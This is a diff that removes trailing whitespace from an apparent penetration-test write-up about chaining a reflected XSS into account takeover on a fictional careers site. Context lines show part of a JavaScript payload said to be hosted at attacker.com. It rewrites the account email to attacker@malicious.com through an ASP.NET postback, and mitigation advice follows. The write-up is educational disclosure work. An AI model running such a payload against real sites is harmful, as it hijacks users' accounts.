@@ -18,7 +18,7 @@ The beauty of this attack chain lies in its simplicity and effectiveness. By fin
 
 ## Important Disclaimer !
 
-**All company names, domains, URLs, and personal data presented in this article are entirely fictional.** 
+**All company names, domains, URLs, and personal data presented in this article are entirely fictional.**
 
 While the attack methodology and techniques described are based on a real-world security assessment, all identifying details have been completely changed to protect confidentiality. The vulnerabilities described have since been remediated by the affected organization. This article is published for educational purposes only.
 
@@ -118,7 +118,7 @@ When decoded, the base64 data revealed the following HTML structure:
 
 ```html
 <head><link rel="stylesheet" type="text/css" href="/DXR.axd?r=1_12,1_5,1_3-A3oBu"><title>
-	Cross Site Corp Careers	
+	Cross Site Corp Careers
 </title><meta name="viewport" content="width=device-width, initial-scale=1">
         <meta http-equiv="X-UA-Compatible" content="IE=9">
         <link rel="Company Icon" href="/images/logo.png">
@@ -219,7 +219,7 @@ We created a JavaScript payload to host on our server (attacker.com/exploit.js):
   // Set the target button that would normally be clicked
   data.set("__EVENTTARGET", "ctl00$Main$btnSave$btnPrimary");
   data.set("__EVENTARGUMENT", "");
-  
+
   // Change the email to one we control
   data.set("ctl00$Main$txtEmail$txtText", "attacker@malicious.com");
 
@@ -395,7 +395,7 @@ This attack chain demonstrates how a seemingly low-impact XSS vulnerability can 
 
 ## 8. Mitigation Steps
 
-Protecting against this type of attack chain requires implementing several complementary security measures. Properly encoding all user input when reflecting it in HTML responses forms the first line of defense against XSS vulnerabilities, preventing attackers from injecting malicious scripts. 
+Protecting against this type of attack chain requires implementing several complementary security measures. Properly encoding all user input when reflecting it in HTML responses forms the first line of defense against XSS vulnerabilities, preventing attackers from injecting malicious scripts.
 
 A robust Content Security Policy header provides an additional layer of protection by restricting which domains can serve executable scripts to your application. A policy like default-src 'self'; script-src 'self' would effectively prevent loading external malicious scripts, blocking the attack chain we demonstrated.
 
@@ -431,7 +431,7 @@ The data exfiltration component reveals a critical privacy dimension often overl
 
 As web applications continue to evolve and grow more complex, we can expect attackers to discover new ways of chaining vulnerabilities together. By understanding these sophisticated attack paths and implementing appropriate defenses, organizations can better protect their users' sensitive data and maintain the trust that's essential to their digital operations.
 
-Happy Hacking! (Ethically, of course) 
+Happy Hacking! (Ethically, of course)
 
 ---
 
